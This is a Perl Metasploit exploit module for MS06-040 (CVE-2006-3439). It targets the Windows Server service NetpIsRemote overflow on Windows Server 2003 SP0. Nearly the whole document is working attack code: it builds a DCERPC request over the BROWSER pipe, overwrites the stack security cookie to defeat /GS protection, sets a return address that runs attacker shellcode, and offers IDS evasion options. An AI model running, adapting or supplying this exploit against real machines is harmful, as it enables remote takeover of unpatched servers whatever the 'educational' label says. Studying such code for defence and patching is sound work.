MS Windows NetpIsRemote() Remote Overflow Exploit (MS06-040) (2k3)
==================================================================

#########################################################################
# netapi_win2003.pm (MS06-040 Exploit for Windows Server 2003 SP0)
#
# Author: Trirat Puttaraksa (Kira) <trir00t [at] gmail.com>
#
# http://sf-freedom.blogspot.com
# 
# For educational purpose only
#
# Note: This exploit is developed because of my question "Is it exploitable
# on Windows Server 2003 platform ?". As I know, Windows XP SP2 and Windows
# Server 2003 SP1 is not exploitable because they are compiled with /GS, but
# how about Windows Server 2003 SP0 ? In metasploit netapi_ms06_040.pm there
# is no Windows Server 2003 sp0 target, this means 2003 SP0 is not 
# exploitable ? There is Stack Protection Windows Server 2003, is this the
# reasons why there is no Windows Server 2003 SP0 exploit for MS06-040 ?
#
# I start to modify H D Moore&#039;s exploit (netapi_ms06_040.pm - credits to him
# ^-^) and work on it. The problem is the Stack Protection "security cookie 
# checking". Because wcscpy() method allow me to write to any memory location
# that are marked writable, I decide to write to the location at "security
# cookie" is stored and it works !!! I will describe more implementation details
# in my blog in few days ^-^ 
#
# This exploit tested on Windows Server 2003 SP0 build 3790 and successful 
# exploit 2003 machine in my environment - all patch before MS06-040 
# (KB921883). It&#039;s quite reliable but not 100%. There is the possibility that
# the exploit will fail and the target system process crash. Because I have 
# only one testbase system, I couldn&#039;t confirm this exploit will work on 
# your environment. However feel free to e-mail to me.
#
# Credits: H D Moore
#########################################################################

package Msf::Exploit::netapi_win2003;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::NDR;

my $advanced = {
	&#039;FragSize&#039;    => [ 256, &#039;The DCERPC fragment size&#039; ],
	&#039;BindEvasion&#039; => [ 0,   &#039;IDS Evasion of the bind request&#039; ],
	&#039;DirectSMB&#039;   => [ 0,   &#039;Use direct SMB (445/tcp)&#039; ],
  };

my $info = {
	&#039;Name&#039;    => &#039;MSO6-040 Windows Server 2003 Target&#039;,
	&#039;Version&#039; => &#039;&#039;,
	&#039;Authors&#039; =>
	  [
		&#039;Trirat Puttaraksa (Kira) <trir00t [at] gmail.com>&#039;,
	  ],

	&#039;Arch&#039; => [&#039;x86&#039;],
	&#039;OS&#039;   => [ &#039;win32&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039; => 1,

	&#039;AutoOpts&#039; => { &#039;EXITFUNC&#039; => &#039;thread&#039; },
	
	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039; => [ 1, &#039;ADDR&#039;, &#039;The target address&#039; ],

		# SMB connection options
		&#039;SMBUSER&#039; => [ 0, &#039;DATA&#039;, &#039;The SMB username to connect with&#039;, &#039;&#039; ],
		&#039;SMBPASS&#039; => [ 0, &#039;DATA&#039;, &#039;The password for specified SMB username&#039;, &#039;&#039; ],
		&#039;SMBDOM&#039;  => [ 0, &#039;DATA&#039;, &#039;The domain for specified SMB username&#039;, &#039;&#039; ],
	  },

	&#039;Payload&#039; =>
	  {
	  	# Technically we can use more space than this, but by limiting it
		# to 370 bytes we can use the same request for all Windows SPs.
		&#039;Space&#039;    => 370,
		
		&#039;BadChars&#039; => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
		&#039;Keys&#039;     => [&#039;+ws2ord&#039;],

		# sub esp, 4097 + inc esp makes stack happy
		&#039;Prepend&#039; => "\x81\xc4\xff\xef\xff\xff\x44",
	  },

	&#039;Description&#039; => Pex::Text::Freeform(
		qq{
		This exploit modified from netapi_ms06_040.pm (Metasploit).
		While netapi_ms06_040 of metasploit works on Windows 2000 
		SP0 - SP4 and Windows XP SP0 - SP1, this exploit works on
		Windows Server 2003 SP0.
	  }
	  ),

	&#039;Refs&#039; =>
	  [
		[ &#039;BID&#039;, &#039;19409&#039; ],
		[ &#039;CVE&#039;, &#039;2006-3439&#039; ],
		[ &#039;MSB&#039;, &#039;MS06-040&#039; ],
	  ],

	&#039;DefaultTarget&#039; => 0,
	&#039;Targets&#039;       =>
	  [
		[ &#039;(wcscpy) Windows Server 2003 SP0&#039;, 612],
	  ],

	&#039;Keys&#039; => [&#039;srvsvc&#039;],

	&#039;DisclosureDate&#039; => &#039;&#039;,
  };

sub new {
	my ($class) = @_;
	my $self =
	  $class->SUPER::new( { &#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target_name = &#039;*SMBSERVER&#039;;

	my $FragSize = $self->GetVar(&#039;FragSize&#039;) || 256;
	my $target   = $self->Targets->[$target_idx];

	if (!$self->InitNops(128)) {
		$self->PrintLine("Could not initialize the nop module");
		return;
	}

	my ( $res, $rpc );

	my $pipe    = &#039;\BROWSER&#039;;
	my $uuid    = &#039;4b324fc8-1670-01d3-1278-5a47bf6ee188&#039;;
	my $version = &#039;3.0&#039;;

	my $handle = Pex::DCERPC::build_handle( $uuid, $version, &#039;ncacn_np&#039;, $target_host, $pipe );

	my $dce = Pex::DCERPC->new(
		&#039;handle&#039;      => $handle,
		&#039;username&#039;    => $self->GetVar(&#039;SMBUSER&#039;),
		&#039;password&#039;    => $self->GetVar(&#039;SMBPASS&#039;),
		&#039;domain&#039;      => $self->GetVar(&#039;SMBDOM&#039;),
		&#039;fragsize&#039;    => $self->GetVar(&#039;FragSize&#039;),
		&#039;bindevasion&#039; => $self->GetVar(&#039;BindEvasion&#039;),
		&#039;directsmb&#039;   => $self->GetVar(&#039;DirectSMB&#039;),
	  );

	if ( !$dce ) {
		$self->PrintLine("[*] Could not bind to $handle");
		return;
	}

	my $smb = $dce->{&#039;_handles&#039;}{$handle}{&#039;connection&#039;};
	
	if (! $smb) {
		$self->PrintLine("[*] Could not establish SMB session");
		return;
	}

	my $stub;

	#
	# Use the wcscpy() method on Windows Server 2003 SP0
	#	
	if ($target->[0] =~ /2003/) {

		my $path = 	
			$shellcode.

			# Padding
			Pex::Text::AlphaNumText($target->[1] - length($shellcode)).
			Pex::Text::AlphaNumText(32).
			substr($shellcode, 0, 4).	# cookie
			Pex::Text::AlphaNumText(4).
			# return address == address that store security cookie
			("\xec\xc1\xc8\x71") . 
			Pex::Text::AlphaNumText(8).

			("\xec\xc1\xc8\x71" x 2) .
			Pex::Text::AlphaNumText(36).

			# Terminate
			"\x00\x00";


		# Package that into a stub
		$stub =
			Pex::NDR::Long(int(rand(0xffffffff))).
			Pex::NDR::UnicodeConformantVaryingString(&#039;&#039;).
			Pex::NDR::UnicodeConformantVaryingStringPreBuilt($path).
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::UnicodeConformantVaryingString(&#039;&#039;).
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::Long(0);
	}
	else {
		$self->PrintLine("This target is not currently supported");
		return;
	}


	$self->PrintLine("[*] Sending request...");
	
	# Function 0x1f is not the only way to exploit this :-)
	my @response = $dce->request( $handle, 0x1f, $stub );
	
	if ( length($dce->{&#039;response&#039;}->{&#039;StubData&#039;}) > 0) {
		$self->PrintLine("[*] The server rejected it, trying again...");
		@response = $dce->request( $handle, 0x1f, $stub );
	}
	
	if ( length($dce->{&#039;response&#039;}->{&#039;StubData&#039;}) > 0) {
		$self->PrintLine("[*] Exploit Failed");
	}
	
	if (@response) {
		$self->PrintLine(&#039;[*] RPC server responded with:&#039;);
		foreach my $line (@response) {
			$self->PrintLine( &#039;[*] &#039; . $line );
		}
	}

	return;
}

1;


